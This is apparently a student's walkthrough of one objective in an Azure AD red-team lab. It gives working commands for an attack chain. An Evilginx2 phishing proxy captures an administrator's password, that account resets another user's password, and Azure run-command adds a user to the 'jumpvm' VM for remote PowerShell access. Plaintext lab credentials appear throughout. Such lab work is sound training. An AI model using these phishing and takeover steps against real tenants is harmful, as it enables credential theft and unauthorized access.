## Objective 16

```
- Using the information collected from the IAM of 'jumpvm' about others users, execute a phishing attack against the user that has Authentication Administrator role.
- Use the Authentication Administrator privileges to reset password of a user who is a member of a group that has command execution privileges on the jumpvm.
- Get command execution on the jumpvm VM.
```

Roy -> can change password VMContributorX users -> can execute command on `jumpvm`

So phish the Roy and retrieve the password of him.

- Phish the user roygcain@defcorphq.onmicrosoft.com using Evilginx2. Run the following command on your student VM to start setting up the tool:
```powershell
evilginx2 -p C:\AzAD\Tools\evilginx2\phishlets
config domain studentx.corp
config ip 172.16.x.x
phishlets hostname o365 login.studentx.corp
phishlets get-hosts o365
```
- Setup DNS server with Technitium DNS server.
```
http://172.16.2.50:5380/
username: admin
password: admin@123
```
- Enable phishlets on evilginx2
```powershell
phishlets enable o365
```
- Copy certificates and run command to enable phishlets and lures
```powershell
Copy-Item C:\Users\studentuserx\.evilginx\crt\ca.crt C:\Users\studentuserx\.evilginx\crt\login.studentx.corp\o365.crt
Copy-Item C:\Users\studentuserx\.evilginx\crt\private.key C:\Users\studentuserx\.evilginx\crt\login.studentx.corp\o365.key
phishlets enable o365
lures create o365
```
- Send the lure to `roygcain@defcorphq.onmicrosoft.com`
 ![test](/img/obj17.png "Enumeration")
- Connect to AzureAD using credentials of the user Roy and reset to password of the user `VMContributorx@defcorphq.onmicrosoft.com`
```powershell
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
$password = ConvertTo-SecureString '$3cur3c@!nMoka7985@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('roygcain@defcorphq.onmicrosoft.com', $password)
Connect-AzureAD -Credential $creds
```

```powershell
$password = "VM@Contributor@123@321" | ConvertToSecureString -AsPlainText –Force
(Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq
"VMContributorx@defcorphq.onmicrosoft.com"}).ObjectId | SetAzureADUserPassword -Password $Password –Verbose
```

- Connect as user `VMContributorx@defcorphq.onmicrosoft.com`
```powershell
Disconnect-AzureAD
$password = ConvertTo-SecureString 'VM@Contributor@123@321'-AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('VMContributorx@defcorphq.onmicrosoft.com', $password)
Connect-AzAccount -Credential $creds
```
- Before running any command on the jumpvm, gather more information (like operating system and public IP – if any):
```powershell
 Get-AzVM -Name jumpvm -ResourceGroupName RESEARCH | fl *
 Get-AzVM -Name jumpvm -ResourceGroupName RESEARCH | select -ExpandProperty NetworkProfile
 Get-AzNetworkInterface -Name jumpvm741
 Get-AzPublicIpAddress -Name jumpvm-ip
```
- Run a PowerShell script on jumpVM and add a user to it
```powershell
Invoke-AzVMRunCommand -ScriptPath C:\AzAD\Tools\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'jumpvm' -ResourceGroupName 'Research' –Verbose
```

- Now connect to the VM using the user that we just added
```powershell
$password = ConvertTo-SecureString 'StudxPassword@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('studentx', $password)
$jumpvm = New-PSSession -ComputerName 51.116.180.87 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession -Session $jumpvm
